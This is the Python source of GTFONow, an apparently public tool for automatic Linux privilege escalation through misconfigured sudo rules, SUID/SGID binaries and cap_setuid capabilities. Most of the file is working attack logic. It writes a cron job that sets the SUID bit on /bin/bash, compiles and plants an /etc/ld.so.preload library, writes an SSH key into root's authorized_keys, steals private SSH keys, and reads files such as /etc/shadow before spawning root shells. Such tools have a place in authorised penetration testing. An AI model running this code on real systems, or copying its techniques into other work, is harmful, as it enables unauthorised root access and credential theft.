#! /usr/bin/env/python
# -*- coding: utf-8 -*-
# https://github.com/Frissi0n/GTFONow
# Automatic privilege escalation for misconfiguRED capabilities, sudo and suid binaries.

from __future__ import print_function
import subprocess
import getpass
import os
import argparse
import sys
import re
import stat
import grp
import pwd
import logging
import platform
import time
import select

# SUDO_BINS_START
sudo_bins = {}
# SUDO_BINS_END

# SUID_BINS_START
suid_bins = {}
# SUID_BINS_END

# CAPABILITIES_START
capabilities = {}
# CAPABILITIES_END

SUDO_NO_PASSWD = "Sudo NOPASSWD"
SUID_SGID = "SUID/SGID Binary"
try:
    input = raw_input
except NameError:
    pass

RED = '\033[31m'
GREEN = '\033[32m'
LIGHTGREY = '\033[37m'
RESET = '\033[0m'
YELLOW = '\033[0;33m'
BOLD = '\033[1m'


class CustomLogger(logging.Logger):
    def __init__(self, name, level=logging.DEBUG):
        super(CustomLogger, self).__init__(name, level)

        self.console_handler = logging.StreamHandler()
        self.console_handler.setLevel(logging.DEBUG)

        formatter = CustomFormatter()
        self.console_handler.setFormatter(formatter)

        self.addHandler(self.console_handler)

    def set_level(self, level):
        self.setLevel(level)
        self.console_handler.setLevel(level)


class CustomFormatter(logging.Formatter):
    def format(self, record):
        if record.levelno == logging.INFO:
            record.msg = GREEN + "[+] " + RESET + str(record.msg)
        elif record.levelno == logging.ERROR:
            record.msg = RED + "[x] " + RESET + str(record.msg)
        elif record.levelno == logging.WARNING:
            record.msg = GREEN + "[!] " + RESET + str(record.msg)
        return super(CustomFormatter, self).format(record)


logging.setLoggerClass(CustomLogger)

log = logging.getLogger(__name__)
log.set_level(logging.INFO)


def execute_command(command):
    """
    Executes a given command using subprocess and returns the output.
    Compatible with Python 2.* and 3.*.

    :param command: Command to execute as a string or list.
    :return: A tuple containing the standard output and standard error.
    """
    try:
        if isinstance(command, list):
            command = " ".join(command)

        log.debug("Executing %s", command)

        process = subprocess.Popen(
            command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)

        output, error = process.communicate()

        if sys.version_info[0] == 3:
            output = output.decode('utf-8') if output else output
            error = error.decode('utf-8') if error else error

        if output:
            log.debug("Output: %s", output)
        if error:
            log.error("Error: %s", error)
        return output, error

    except OSError as e:
        return None, "OS error occurred: " + str(e)


def arbitrary_file_read(binary, payload, auto, user="root", command=None):
    """Exploit arbitrary file read vulnerability.

    Args:
        binary (str): Binary to exploit.
        payload (str): Exploit payload.
    """
    log.info("Performing arbitrary file read with %s", binary)

    if is_service_running("ssh"):
        ssh_key_privesc(payload, user, command)
    if auto:
        return
    print("Enter the file that you wish to read. (eg: /etc/shadow)")
    file_to_read = input("> ")
    payload = payload.replace("file_to_read", file_to_read)
    os.system(payload)


def get_arb_write_options(user):
    options = []
    if is_service_running("ssh"):
        options.append(("ssh", "Obtain shell by writing SSH key"))
    if user == "root" and is_service_running("cron"):
        options.append(("cron", "Obtain shell by writing to Cron"))
    options.append(("ld_preload", "Obtain shell by writing to LD_PRELOAD"))
    options.append(("arbitrary", "Arbitrary file Write (no shell)"))
    return options


def arbitrary_file_write(binary, payload, risk, auto, user="root", command=None):
    """Exploit arbitrary file write.

    Args:
        binary (str): Binary to exploit.
        payload (str): Exploit payload.
        user (str): User to exploit.
    """
    log.info("Performing arbitrary file write with %s", binary)
    if risk == 1:
        manual_arbitrary_file_write(payload)
        return
    if risk == 2 and not auto:
        options = get_arb_write_options(user)
        print("\nSelect an exploit option:")
        for index, (_, description) in enumerate(options):
            print(GREEN + "[" + str(index) + "] " + RESET + description)
        choice = get_user_choice("> ")
        chosen_option = options[choice][0]
        if chosen_option == "ssh":
            ssh_write_privesc(payload, user, command)
        elif chosen_option == "cron":
            cron_priv_esc(payload, command)
        elif chosen_option == "ld_preload":
            ld_preload_exploit(binary, payload, command)
        elif chosen_option == "arbitrary":
            manual_arbitrary_file_write(payload)
    if risk == 2 and auto:
        options = get_arb_write_options(user)
        for option in options:
            if option[0] == "ssh":
                ssh_write_privesc(payload, user, command)
            if option[0] == "ld_preload":
                ld_preload_exploit(binary, payload, command)
            if option[0] == "cron":
                cron_priv_esc(payload, command)


def manual_arbitrary_file_write(payload):
    print("Create a file named " + GREEN + "input_file" +
          RESET + " containing the file content")
    log.info("Spawning temporary shell to create file, type 'exit' when done")
    os.system("/bin/bash")
    print("Enter the file path that you wish to write to. (eg: /root/.ssh/authorized_keys)")
    file_to_write = input("> ")
    payload = payload.replace("file_to_write", file_to_write)
    os.system(payload)


def spawn_shell(payload):
    """Spawn shell, if exits with return code 0, we assume exploit worked and this is a user controlled exit."""
    if sys.version_info[0] < 3:
        res = subprocess.call(payload, shell=True)
    else:
        res = subprocess.run(payload, shell=True)
    if res.returncode == 0:
        print("Thanks for using GTFONow!")
        sys.exit()


def exploit(binary,  payload, exploit_type, risk, auto, binary_path=None, user="root", command=None):
    """Exploit a binary.

    Args:
        binary (str): Binary to exploit.
        payload (str): Exploit payload.
        binary_path (str, optional): Path to binary.. Defaults to None.
        user (str, optional): User to exploit. Defaults to "root".
    """

    if exploit_type == SUDO_NO_PASSWD and user != "root":
        payload = payload.replace("sudo", "sudo -u " + user)
    if binary_path:
        payload = payload.replace("./"+binary, binary_path)
    else:
        payload = payload.replace("./"+binary, binary)
    if "file_to_read" in payload:
        arbitrary_file_read(binary, payload, auto, user, command)
    elif "file_to_write" in payload:
        arbitrary_file_write(binary, payload, risk,  auto, user, command)
    else:
        if command:
            execute_privileged_command(payload, command)
        else:
            log.info("Spawning %s shell", user)
            spawn_shell(payload)


def execute_privileged_command(payload, command):
    log.debug("Executing %s", payload)
    process = subprocess.Popen(
        payload, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    bytes_command = (command + "\n").encode('utf-8')
    process.stdin.write(bytes_command)
    out, err = process.communicate()
    if out:
        print(out)
    if process.returncode == 0:
        print("Thanks for using GTFONow!")
        sys.exit()
    if err:
        log.error(err)


def get_sudo_l_output():
    """Gets the output of sudo -l command.

    Returns:
        str: Output of sudo -l command.
    """
    try:
        process = subprocess.Popen(
            ['sudo', '-l'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        for _ in range(10):
            time.sleep(0.1)
            if process.poll() is not None:
                break
        else:
            process.kill()
            print("Command timed out. User may need to enter a password.")
            return

        stdout, _ = process.communicate()

        if sys.version_info[0] >= 3:
            stdout = stdout.decode('utf-8')

        return stdout
    except Exception as e:
        print("Error: " + str(e))
        return


def check_sudo_binaries(sudo_l_output):
    """Checks for privilege escalations via binaries in sudo -l output.

    Args:
        sudo_l_output (str): Output of sudo -l command.

    Returns:
        list: Returns a list of potential privilege escalations.
    """
    priv_escs = []
    all_matches = re.findall(r'\(.*\) (.*)', sudo_l_output)
    for match in all_matches:
        if 'NOPASSWD' not in match:
            binaries = match.split(', ')
            for binary_path in binaries:
                binary = binary_path.split('/')[-1]
                if binary not in sudo_bins.keys():
                    continue

                payloads = sudo_bins.get(binary)
                priv_esc = {
                    "Binary": binary,
                    "Path": binary_path,
                    "Payloads": payloads,
                    "Type": "Sudo (Needs Password)"
                }
                priv_escs = priv_escs + expand_payloads(priv_esc)

    return priv_escs


def expand_payloads(priv_esc):
    """Given a priv esc entry, expand into multiple payloads."""

    priv_escs = []

    for payload in priv_esc["Payloads"]:
        priv_esc_copy = priv_esc.copy()
        priv_esc_copy["Payload"] = payload["code"]
        priv_esc_copy["Payload Description"] = payload.get("description")
        priv_esc_copy["Payload Type"] = payload_type(payload["code"])
        del priv_esc_copy["Payloads"]
        priv_escs.append(priv_esc_copy)
    return priv_escs


def check_sudo_nopasswd_binaries(sudo_l_output):
    """Checks for privilege escalations via NOPASSWD binaries in sudo -l output.

    Args:
        sudo_l_output (str): Output of sudo -l command.

    Returns:
        list: Returns a list of potential privilege escalations.
    """
    priv_escs = []
    matches = re.findall(r'\(([^)]+)\) NOPASSWD: (.*)', sudo_l_output)
    for user, command_paths in matches:
        if user.lower() == "all":
            user = "root"
        binaries = command_paths.split(', ')
        for binary_path in binaries:
            binary = binary_path.split('/')[-1]
            if binary not in sudo_bins.keys():
                log.info("Found NOPASSWD binary %s, but no known exploit.", binary)
                continue

            payloads = sudo_bins.get(binary)
            priv_esc = {
                "SudoUser": user,
                "Binary": binary,
                "Path": binary_path,
                "Payloads": payloads,
                "Type": SUDO_NO_PASSWD
            }
            log.warning("Found exploitable %s binary: %s",
                        SUDO_NO_PASSWD, binary_path)
            priv_escs = priv_escs + expand_payloads(priv_esc)

    return priv_escs


def is_linux():
    """
    Check if the host operating system is a variant of Linux.

    Returns:
        bool: True if the OS is Linux, False otherwise.
    """
    return platform.system() == "Linux"


def check_suid_bins():
    """
    Checks if any binaries in PATH are suid or sgid binaries and referenced in GTFOBins.

    Returns:
        list: A list of potential privilege escalations.
    """
    priv_escs = []
    for binary, payloads in suid_bins.items():
        binary_path = get_binary_path(binary)
        if not binary_path:
            continue

        file_properties = check_suid_sgid(binary_path)
        is_suid = file_properties.get("SUID")
        is_sgid = file_properties.get("SGID")

        if is_suid or is_sgid:
            priv_esc = {
                "Binary": binary,
                "Path": binary_path,
                "Payloads": payloads,
                "Type": SUID_SGID,
                "SUID": file_properties.get("Owner") if is_suid else None,
                "SGID": file_properties.get("Group") if is_sgid else None
            }
            priv_escs = priv_escs + expand_payloads(priv_esc)

            log.warning("Found exploitable %s binary: %s", "suid" if is_suid else "sgid",
                        binary_path)

    return priv_escs


def check_capability(binary_path, capability):
    """
    Check if the given capability (e.g., 'cap_setuid') is set on the binary using the getcap command.

    Args:
    binary_path (str): The full path to the binary.
    capability (str): The capability to check for (e.g., 'cap_setuid').

    Returns:
    bool: True if the capability is set, False otherwise.
    """

    if get_binary_path("getcap") is None:
        log.error("getcap not found in PATH, cannot escalate using capabilities")
        return

    try:
        result, error = execute_command(["getcap", binary_path])

        if capability in result.decode('utf-8'):
            return True
        return False

    except subprocess.CalledProcessError as e:
        print("Error: %s", e)
        return False


def is_service_running(service):
    """
    Check if a service is running.

    Returns:
    bool: True if service is running, False otherwise.
    """

    if get_binary_path("service"):
        result, error = execute_command(["service", service, "status"])
        if " is running" in result:
            return True
    if get_binary_path("systemctl"):
        result, error = execute_command(["systemctl", "status", service])
        if "active (running)" in result:
            return True
    return False


def cron_priv_esc(payload, command=None):
    """Turns arbitrary write into shell by writing to cron.

    Args:
        payload (str): Exploit payload.
    """
    CRONTAB_PATHS = ["/etc/cron.d/", "/etc/cron.daily/", "/etc/cron.hourly/",
                     "/etc/cron.monthly/", "/etc/cron.weekly/", "/var/spool/cron/crontabs/"]

    file_to_write = "/var/spool/cron/crontabs/root"
    payload = payload.replace("file_to_write", file_to_write)
    payload = payload.replace("DATA", "* * * * * chmod u+s /bin/bash")
    log.info("Writing payload to crontab %s", file_to_write)
    execute_command(payload)
    log.info("Waiting for cron to execute payload")
    count = 0
    while True:
        if check_suid_sgid("/bin/bash").get("SUID") and check_suid_sgid("/bin/bash").get("Owner") == "root":
            log.info("SUID bit set on /bin/bash, spawning root shell")
            if command:
                execute_privileged_command(payload, command)
            else:
                spawn_shell("/bin/bash -p")
            break
        time.sleep(1)
        count = count + 1
        if count > 65:
            log.error("Cron did not execute payload, something went wrong.")
            break


def ld_preload_exploit(binary, payload, command=None):
    """Turns arbitrary write into shell by writing to /etc/ld.so.preload

    Args:
        Binary (str): Binary to exploit.
        payload (str): Exploit payload.
    """
    if get_binary_path("gcc") is None:
        log.error("gcc not found in PATH, cannot escalate using LD_PRELOAD")
        return

    lib_src = """
    #include <stdio.h>
    #include <sys/types.h>
    #include <unistd.h>
    __attribute__ ((__constructor__))
    void dropshell(void){
        chown("/bin/bash", 0, 0);
        chmod("/bin/bash", 04755);
        unlink("/etc/ld.so.preload");
        printf("Complete.");
    }
    """

    f = open("/tmp/libpwn.c", "w")
    f.write(lib_src)
    f.close()
    execute_command("gcc -w -shared -o /tmp/libpwn.so /tmp/libpwn.c")

    # f = open("/tmp/libpwn.so", "rb")
    # binary_data = f.read()
    # lib_data = ''.join(f'\\x{byte:02x}' for byte in binary_data)
    # payload_1 = payload.replace("DATA", lib_data)
    # payload_1 = payload_1.replace("file_to_write", "/lib/libgtfo.so")
    # payload_1 = payload_1.replace("echo", "echo -n -e")

    payload = re.sub("data", "/tmp/libpwn.so", payload, flags=re.IGNORECASE)
    payload = payload.replace("file_to_write", "/etc/ld.so.preload")
    execute_command(payload)
    execute_command(binary + " --help >/dev/null 2>&1")

    if check_suid_sgid("/bin/bash").get("SUID") and check_suid_sgid("/bin/bash").get("Owner") == "root":
        log.info("SUID bit set on /bin/bash, spawning root shell")
        if command:
            execute_privileged_command("/bin/bash -p", command)
        else:
            spawn_shell("/bin/bash -p")


def check_cap_bins():
    """Checks if any binaries in PATH are have vulnerable capabilities referenced in GTFOBins."""

    if get_binary_path("getcap") is None:
        log.error("getcap not found in PATH, cannot escalate using capabilities")
        return []

    potential_privesc = []
    for binary, payloads in capabilities.items():
        binary_path = get_binary_path(binary)
        if binary_path is None:
            continue
        if check_capability(binary_path, "cap_setuid"):
            log.warning(
                "Found exploitable suid binary: %s", binary)
            priv_esc = {"Binary": binary, "Path": binary_path,
                        "Payloads": payloads, "Type": "Capability", "Capability": "cap_setuid"}
            potential_privesc.append(priv_esc)
    return potential_privesc


# def is_binary_in_gtfobins(binary, gtfo_list):
#     # Check for specific versions of python, not caught by default list
#     pattern = r'^python\d+(\.\d+)?$'
#     if re.match(pattern, binary):
#         binary = "python"
#     return binary in gtfo_list.keys()


def check_cap_full_disk():
    """Checks if any binaries on the filesystem have vulnerable capabilities

    Returns:
        list: Returns a list of potential privilege escalations.
    """

    if get_binary_path("getcap") is None:
        log.error("getcap not found in PATH, cannot escalate using capabilities")
        return []
    res, err = execute_command("getcap -r / 2>/dev/null")
    potential_privesc = []

    for line in res.splitlines()[:-1]:
        line = line.decode("utf-8")
        parts = line.split(" ")
        caps = parts[-1]
        cap_parts = caps.split(",")
        binary_path = " ".join(parts[:-1])
        for cap in cap_parts:
            if "setuid" in cap:
                binary = binary_path.split("/")[-1]
                if binary in capabilities.keys():
                    priv_esc = {"Binary": binary, "Path": binary_path,
                                "Payloads": capabilities[binary], "Type": "Capability", "Capability": cap}
                    log.warning(
                        "Found cap_setuid binary: %s",  binary_path)
                    potential_privesc.append(priv_esc)
                else:
                    log.info(
                        "cap_setuid binary %s found, but no public exploit in GTFOBins", binary_path)
            else:
                log.info(
                    "Found unexploitable capability %s for %s", cap, binary_path)

    return potential_privesc


def ssh_write_privesc(payload, user="root", command=None):
    """Turns arbitrary write into shell by writing to user's SSH key

    Args:
        payload (str): Exploit payload
        user (str, optional): User to exploit. Defaults to "root".
    """

    if get_binary_path("ssh-keygen") is None:
        log.error("ssh-keygen not found in PATH, cannot escalate using SSH key")
        return

    if user == "root":
        home_dir = "/root"
    else:
        home_dir = "/home/"+user
    log.info("Writing SSH key to %s", home_dir+"/.ssh/authorized_keys")

    execute_command("ssh-keygen -N '' -f /tmp/gtfokey")
    with open("/tmp/gtfokey.pub", "r") as f:
        pub_key = f.read()
        pub_key = pub_key.strip()
        payload = payload.replace("DATA", pub_key)
        payload = payload.replace(
            "file_to_write", home_dir+"/.ssh/authorized_keys")

        res, err = execute_command(payload)
        shell_payload = "ssh -o StrictHostKeyChecking=no -i /tmp/gtfokey "+user+"@localhost"
        if not err:
            if command:
                execute_privileged_command(shell_payload, command)
            else:
                spawn_shell(shell_payload)


def ssh_key_privesc(payload, user="root", command=None):
    """Turns arbitrary read into shell by reading user's SSH key.

    Args:
        payload (str): Exploit payload.
        user (str, optional): User to exploit. Defaults to "root".
    """

    key_names = ["id_dsa", "id_ed25519", "id_rsa", "id_ecdsa"]

    if user == "root":
        home_dir = "/root"
    else:
        home_dir = "/home/"+user
    log.info("Checking for SSH keys in %s", home_dir+"/.ssh/")

    for key in key_names:
        path = home_dir+"/.ssh/"+key
        exploit_payload = payload.replace("file_to_read", path)
        res, err = execute_command(exploit_payload)
        if not err:
            priv_key = res.strip()
            if "encrypted" in priv_key.lower():
                log.error("Key %s is encrypted, skipping", path)
            log.info("Spawning %s SSH shell using %s", user, path)
            shell_payload = "ssh-agent bash -c \"ssh-add <(echo '" + priv_key + \
                "') && ssh -o \"StrictHostKeyChecking=no\" "+user+"@localhost\""
            if command:
                execute_privileged_command(shell_payload, command)
            else:
                spawn_shell(shell_payload)


def payload_type(payload):
    """Determine payload type.

    Args:
        payload (str): Exploit payload.

    Returns:
        str: Payload type, eg shell, or arbitrary read.
    """
    if "file_to_read" in payload:
        return "Arbitrary read"
    elif "file_to_write" in payload:
        return "Arbitrary write"
    elif "file_to_change" in payload:
        return "File Permission Change"
    elif "sh" in payload:
        return "Shell"
    else:
        return "Unknown"


def get_binary_path(binary_name):
    """
    Find the full path of a binary, similar to the Unix 'which' command.

    Args:
    binary_name (str): The name of the binary to search for.

    Returns:
    str: The full path to the binary if found, otherwise None.
    """
    for path in os.environ["PATH"].split(os.pathsep):
        full_path = os.path.join(path, binary_name)
        if os.path.isfile(full_path) and os.access(full_path, os.X_OK):
            log.debug("Found %s at %s", binary_name, full_path)
            return full_path
    log.debug("Could not find %s in PATH", binary_name)
    return None


def check_suid_sgid(file_path):
    """
    Check if the SUID or SGID bit is set on the file at the given path and return the owner and group.

    Args:
        file_path (str): The path to the file.

    Returns:
        dict: A dictionary with the SUID and SGID status, and owner and group of the file.
    """
    try:
        file_stat = os.stat(file_path)
        mode = file_stat.st_mode

        is_suid = bool(mode & stat.S_ISUID)
        is_sgid = bool(mode & stat.S_ISGID)

        owner_id = file_stat.st_uid
        group_id = file_stat.st_gid

        owner_name = pwd.getpwuid(owner_id).pw_name
        group_name = grp.getgrgid(group_id).gr_name

        return {"SUID": is_suid, "SGID": is_sgid, "Owner": owner_name, "Group": group_name}

    except FileNotFoundError:
        return {"Error": "File not found"}


def is_binary_in_path(binary_path):
    """
    Check if the given binary path is in the user's PATH.

    Args:
        binary_path (str): The full path to the binary.

    Returns:
        bool: True if the binary is in the PATH, False otherwise.
    """
    binary_name = os.path.basename(binary_path)

    for path in os.environ["PATH"].split(os.pathsep):
        full_path = os.path.join(path, binary_name)
        if os.path.isfile(full_path) and os.access(full_path, os.X_OK):
            return True
    return False


def check_suid_full_disk():
    """Searches files system for vulnerable suid and sguid binaries.

    Returns:
        list: Returns a list of potential privilege escalations.
    """

    res, err = execute_command("find / -perm -4000 -type f 2>/dev/null")
    binary_paths = res.split("\n")[:-1]
    res, err = execute_command("find / -perm -2000 -type f 2>/dev/null")
    sgid_binaries = res.split("\n")[:-1]
    new_binaries = set(binary_paths) - set(sgid_binaries)
    binary_paths.extend(new_binaries)

    potential_privesc = []
    for binary_path in binary_paths:
        if is_binary_in_path(binary_path):
            continue
        binary = binary_path.split("/")[-1]
        if binary in suid_bins.keys():
            file_properties = check_suid_sgid(binary_path)
            is_suid = file_properties.get("SUID")
            is_sgid = file_properties.get("SGID")
            priv_esc = {
                "Binary": binary,
                "Path": binary_path,
                "Payloads": suid_bins[binary],
                "Type": SUID_SGID,
                "SUID": file_properties.get("Owner") if is_suid else None,
                "SGID": file_properties.get("Group") if is_sgid else None
            }
            log.warning(
                "Found exploitable suid binary outside of user's PATH: %s", binary_path)
            potential_privesc.append(priv_esc)
        else:
            log.info(
                "Found suid/sgid binary, however there is no known GTFOBin exploit: %s", binary_path)
    return potential_privesc


def get_user_choice(prompt):
    choice = input("\n"+prompt)
    return int(choice)


def print_banner():
    print(GREEN+r"""
  ___________________  _  __          
 / ___/_  __/ __/ __ \/ |/ /__ _    __
/ (_ / / / / _// /_/ /    / _ \ |/|/ /
\___/ /_/ /_/  \____/_/|_/\___/__,__/ 
"""+RESET)
    print("https://github.com/Frissi0n/GTFONow\n")


def parse_arguments():
    parser = argparse.ArgumentParser(
        description='GTFONow: Automatic privilege escalation using GTFOBins')
    parser.add_argument('--level', default=1, choices=[1, 2], type=int,
                        help='Level of checks to perform. Default level 1 for a quick scan.')
    parser.add_argument("--risk", default=1, choices=[1, 2],
                        type=int, help="Risk level of exploit to perform. Default risk level 1 for safe operations.")
    parser.add_argument("--sudo_password", action="store_true",
                        help="If you know the sudo password, enable sudo_password mode for more privilege escalation options.")
    parser.add_argument(
        "--command", help="Rather than spawn an interactive shell, issue a single command. Mainly for debugging purposes only.")
    parser.add_argument('-v', '--verbose', action='store_true',
                        help='Enable verbose output.')
    parser.add_argument("-a", "--auto", action="store_true",
                        help="Auto exploit without prompting for user input.")
    return parser.parse_args()


def get_sudo_password():
    """Securely gets the sudo password from the user.

    Returns:
        str: sudo password.
    """
    print("Enter sudo password:")
    return getpass.getpass("> ")


def perform_privilege_escalation_checks(args):
    sudo_privescs, suid_privescs, cap_privescs = [], [], []

    suid_privescs = check_suid_bins()

    if get_binary_path("sudo"):
        if args.sudo_password:
            sudo_password = get_sudo_password()
        sudo_l_output = get_sudo_l_output()
        if sudo_l_output:
            sudo_privescs.extend(check_sudo_binaries(sudo_l_output))
            sudo_privescs.extend(check_sudo_nopasswd_binaries(sudo_l_output))

    if is_linux():
        cap_privescs.extend(check_cap_bins())

    if args.level >= 2:
        suid_privescs.extend(check_suid_full_disk())
        cap_privescs.extend(check_cap_full_disk() if is_linux() else [])

    return sudo_privescs, suid_privescs, cap_privescs


def display_privilege_escalation_options(priv_escs):
    if not priv_escs:
        logging.warning("No privilege escalations found.")
        sys.exit(1)

    print("\nExploits available:")

    for key, value in enumerate(priv_escs):
        print_formatted_priv_esc_option(key, value)


def print_formatted_priv_esc_option(key, value):
    info = format_priv_esc_info(value)
    print(GREEN+"["+str(key)+"] " + RESET + value['Binary'] +
          GREEN + " " + value["Payload Type"] + RESET)
    print("  Path: " + value["Path"])
    print("  Info: " + info)
    if value.get("Payload Description"):
        print("  Description: " + value["Payload Description"])


def order_priv_escs(priv_esc):
    """Order privilege escalations by exploitability, ease and impact."""

    user = priv_esc.get("SudoUser") or priv_esc.get("SUID")
    if user == "root" or priv_esc["Type"] == "Capability":
        user_priority = 0
    else:
        user_priority = 1

    if priv_esc["Payload Type"] == "Shell":
        payload_priority = 0
    elif priv_esc["Payload Type"] == "Arbitrary read":
        payload_priority = 1
    elif priv_esc["Payload Type"] == "Arbitrary write":
        payload_priority = 2
    elif priv_esc["Payload Type"] == "File Permission Change":
        payload_priority = 3
    else:
        payload_priority = 4

    return (user_priority, payload_priority)


def format_priv_esc_info(priv_esc):
    """
    Formats the privilege escalation information based on the type.
    """
    info = ""
    priv_type = priv_esc["Type"]

    if priv_type == SUDO_NO_PASSWD and priv_esc.get("SudoUser"):
        user = priv_esc.get("SudoUser")
        formatted_user = RED + user + RESET if user == "root" else GREEN + user + RESET
        info = "Sudo NOPASSWD as user " + formatted_user

    elif priv_type == SUID_SGID:
        owner = priv_esc.get("SUID")
        group = priv_esc.get("SGID")
        if owner:
            formatted_owner = RED + owner + RESET if owner == "root" else GREEN + owner + RESET
            info = "SetUID binary as user " + formatted_owner
        if group:
            if info:
                info += ", "
            info += "SetGID binary as group " + group

    elif priv_type == "Capability":
        capability = priv_esc.get("Capability", "N/A")
        info = "Binary with capability " + capability

    return info


def execute_payload(priv_esc, risk, auto, command=None):
    user = priv_esc.get("SudoUser") or priv_esc.get("Owner")
    if user:
        exploit(priv_esc["Binary"], priv_esc["Payload"], priv_esc["Type"], risk, auto,
                binary_path=priv_esc["Path"], user=user, command=command)
    else:
        exploit(priv_esc["Binary"], priv_esc["Payload"], priv_esc["Type"], risk, auto,
                binary_path=priv_esc["Path"], command=command)


def main():
    args = parse_arguments()

    if args.verbose:
        log.set_level(logging.DEBUG)

    print_banner()
    sudo_privescs, suid_privescs, cap_privescs = perform_privilege_escalation_checks(
        args)

    priv_escs = sudo_privescs + suid_privescs + cap_privescs
    priv_escs = sorted(priv_escs, key=order_priv_escs)
    if args.auto and args.risk == 1:
        priv_escs = [item for item in priv_escs if item["Payload Type"] in [
            "Shell", "Arbitrary read"]]

        for priv_esc in priv_escs:
            execute_payload(priv_esc, args.risk, args.auto, args.command)
    if args.auto and args.risk == 2:
        priv_escs = [item for item in priv_escs if item["Payload Type"] in [
            "Shell", "Arbitrary read", "Arbitrary write"]]
        for priv_esc in priv_escs:
            execute_payload(priv_esc, args.risk, args.auto, args.command)
    display_privilege_escalation_options(priv_escs)

    choice = get_user_choice("Choose method to GTFO: ")
    selected_priv_esc = priv_escs[choice]
    execute_payload(selected_priv_esc, args.risk, args.auto, args.command)


if __name__ == "__main__":
    main()
